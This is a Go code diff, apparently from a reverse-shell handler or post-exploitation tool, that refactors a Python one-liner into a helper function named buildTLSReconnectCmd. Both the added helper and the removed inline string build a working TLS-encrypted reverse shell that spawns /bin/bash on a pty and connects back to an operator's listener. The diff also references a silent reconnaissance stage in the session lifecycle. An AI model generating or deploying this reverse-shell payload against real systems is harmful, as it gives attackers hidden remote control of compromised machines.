@@ -90,6 +90,29 @@ func hostFromAddr(addr net.Addr) string {
 }
 
 
+// buildTLSReconnectCmd returns the Python one-liner that spawns a TLS-encrypted
+// reverse shell back to the given listener. The script:
+//  1. Opens a pty pair (openpty)
+//  2. Spawns /bin/bash attached to the slave pty
+//  3. Establishes a TLS connection, pinning the server cert via SHA-256
+//  4. Relays data between the pty master and the TLS socket
+//
+// Used by handleSession, cmdTLSUpgrade, and cmdReset.
+func buildTLSReconnectCmd(pythonBin, host string, port int, fingerprintHex string) string {
+	return fmt.Sprintf(
+		`%s -c "import socket,ssl,os,pty,threading,hashlib,subprocess as sp;`+
+			`m,sv=pty.openpty();`+
+			`p=sp.Popen(['/bin/bash'],stdin=sv,stdout=sv,stderr=sv,start_new_session=True,close_fds=True,pass_fds=[m]);`+
+			`os.close(sv);`+
+			`ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT);ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE;`+
+			`t=ctx.wrap_socket(socket.create_connection(('%s',%d),timeout=10));`+
+			`assert hashlib.sha256(t.getpeercert(binary_form=True)).hexdigest()=='%s';`+
+			`exec('def rd():\n try:\n  while 1:\n   d=t.read(4096)\n   if d:os.write(m,d)\n   else:break\n except:pass\n`+
+			`threading.Thread(target=rd,daemon=True).start()\ntry:\n while 1:\n  d=os.read(m,4096)\n  t.write(d)\nexcept:pass')"`,
+		pythonBin, host, port, fingerprintHex,
+	)
+}
+
 // handleSession runs the full session lifecycle in a background goroutine:
 //
 //	PTY upgrade (spinner) → stop spinner → TLS (printer.Notify) → recon (silent) → background
@@ -137,10 +160,7 @@ func handleSession(sess *Session, opts sessionOpts) {
 				effectiveListenIP = opts.listenIP
 			}
 
-			reconnectCmd := fmt.Sprintf(
-				`%s -c "import socket,ssl,os,pty,threading,hashlib,subprocess as sp;m,sv=pty.openpty();p=sp.Popen(['/bin/bash'],stdin=sv,stdout=sv,stderr=sv,start_new_session=True,close_fds=True,pass_fds=[m]);os.close(sv);ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT);ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE;t=ctx.wrap_socket(socket.create_connection(('%s',%d),timeout=10));assert hashlib.sha256(t.getpeercert(binary_form=True)).hexdigest()=='%s';exec('def rd():\n try:\n  while 1:\n   d=t.read(4096)\n   if d:os.write(m,d)\n   else:break\n except:pass\nthreading.Thread(target=rd,daemon=True).start()\ntry:\n while 1:\n  d=os.read(m,4096)\n  t.write(d)\nexcept:pass')"`,
-				u.pythonBin, effectiveListenIP, opts.listenPort, opts.fingerprintHex,
-			)
+			reconnectCmd := buildTLSReconnectCmd(u.pythonBin, effectiveListenIP, opts.listenPort, opts.fingerprintHex)
 			// Register BEFORE sending the command so acceptLoop routes the
 			// incoming connection here even if Python connects back immediately.
 			origIP := hostFromAddr(addr)
